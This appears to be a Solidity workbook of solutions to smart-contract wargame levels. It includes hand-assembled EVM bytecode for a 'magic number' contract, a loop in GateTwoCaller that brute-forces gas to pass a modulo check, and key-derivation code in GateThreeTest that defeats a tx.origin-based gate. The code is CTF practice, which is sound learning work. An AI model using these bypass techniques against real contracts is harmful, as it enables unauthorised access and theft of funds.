// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract InitCodeTest {
    constructor(){}
    function getBytecode() public view returns (bytes memory) {
          bytes memory bytecode = type(MagicNumberTest).creationCode;
          bytes memory s = type(MagicNumberTest).runtimeCode;
          bytes32 b = bytes32(bytecode);
          console.log("Initcode");
            console.logBytes(bytecode);
                      console.log("Runtimecode");
            console.logBytes(s);

  return bytecode;
    }
}
//0x6080604052348015600f57600080fd5b5069602a60005260006020f3600052603f80602b6000396000f3fe
contract SimpleContract {
    fallback() payable external {
        assembly {
            
        }
    }
}

contract MagicNumberTest {
//0x60 0x2A   //push v <------ 0x2A is "42" in hex (dont forget your towel)
//0x60 0x00   //push p  <---- the memory slot; we will use 0 because our contract has literally nothing else normally important shit goes at slot0 so dont use it in the wild
//0x52    //mstore(p, v) <---- store the value, v at place, p ; mstore uses 32 bytes by defauilt so that will inform us what S is in our return code
//0x60 0x00   //push p   <------ place is 0
//0x60 0x20   //push s <------- size is 32 because of mstore's default size that we put "42" into. (0x20 is 32 in hex)
//0xF3    // return(p, s) <----- return everything in memory from place p with size s
// concat them all to get runtime code: 0x602A60005260006020F3


//INIT CODE
// 0x69 0x602A60005260006020F3 //push10 0x602A60005260006020F3
// 0x60 0x00 //push 0x00
//0x52 //msstore 
//0x60 0x0A //push 0x0A
//0x60 0x16 //push 0x16
//0xF3 //return 
// 0x69602A60005260006020F3600052600A6016F3



constructor() {
    assembly {
        mstore(0x00, 0x602A60005260006020F3)
    }
}
    
}

contract GateTwoTest {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
    modifier gateTwo() {
        console.log("2 gas left inside gateTwo");
        console.logUint(gasleft());
        require(gasleft() % 8191 == 0);
        _;
    }
        modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }
    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {

        entrant = tx.origin;
        return true;
    }

}

interface IGateTwoTest {
    function enter(bytes8) external returns (bool);
}
contract GateTwoCaller {
    GateTwoTest target;
    address targetAddress; 
    constructor(address _target) {
        target = GateTwoTest(_target);
        targetAddress = _target;
    }
    function test() external returns (bool) {
        console.log("1 gas left before calling enter()");
        console.logUint(gasleft());
        uint gasNumber;
        for (uint i = 0; i < 8191; i++) {
            try target.enter{gas:(8191 * 100)  + i}(0x8000000000002266) returns (bool success) {
                gasNumber = (8191 * 100) + i;
            } catch  {
                continue;
            }
        }
        bool success = target.enter{gas:gasNumber}(0x8000000000002266);
        console.log("we achieved greatness");
        console.log(success);
        if (success == true) {
            return true;
        } else {
            return false;
        }
    }
}

contract GateThreeTest {

    modifier gateThree(bytes8 _gateKey) {
     
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }
    // k = 0x B1 B2 B3 B4 B5 B6 B7 B8

    //GATE 3
    // uint32(k) = uint16(uint160(tx.origin))
    // 0x B5 B6 B7 B8 = 0x b8 f4
    //pad for equivalency
    // 0x B5 B6 B7 B8
    // 0x 00 00 b8 f4 <--- replace with the last of your tx.origin
    //// B7, B8 = last 4 bytes of tx. origin, B5 and B6 must be 0

    //GATE 2 
    // uint32(k) != k
    // 0x B5 B6 B7 B8 = 0x B1 B2 B3 B4 B5 B6 B7 B8
    // pad for equivalency
    // 0x 00 00 00 00 B5 B6 B7 B8
    // 0x B1 B2 B3 B4 B5 B6 B7 B8
    //// B1 B2 B3 or B4 must not be 0

    //GATE 1 
    // uint32(k) == uint16(k)
    // 0x B5 B6 B7 B8 = 0x B7 B8
    //pad for equivalency
    // 0x B5 B6 B7 B8
    // 0x 00 00 B7 B8
    // B5 & B6 must both be 0

    //Key Objectives
    // 0x B1 B2 B3 B4 B5 B6 B7 B8

    //// B7, B8 = last 4 bytes of tx. origin
    //// either B1 B2 B3 or B4 must not be 0
    //// B5 & B6 must both be 0

    // 0x 2A 00 00 00 00 00 b8 f4 <--- replace with the last of your tx.origin



    function generateKey() internal view returns (bytes8) {
        bytes8 originatorSequence = bytes8(uint64(uint160(tx.origin)));
        uint16 k = uint16(uint64(originatorSequence));
        uint64 k2 = uint64(1 << 63) + uint64(k);


        console.log("generating key"); 
        console.logBytes8(originatorSequence);
        console.logBytes2(bytes2(k));
        console.logBytes8(bytes8(k2));

        return bytes8(k2);  
    }

    function test(
        bytes8 _gateKey
    ) public view gateThree(_gateKey) returns (bool) {
        return true;
    }

    function pwn() external view returns (bool) {
        bytes8 key = generateKey();
        bool succ = test(key);
        if (succ) {
            return true;
        } else {
            return false;
        }
    }
}
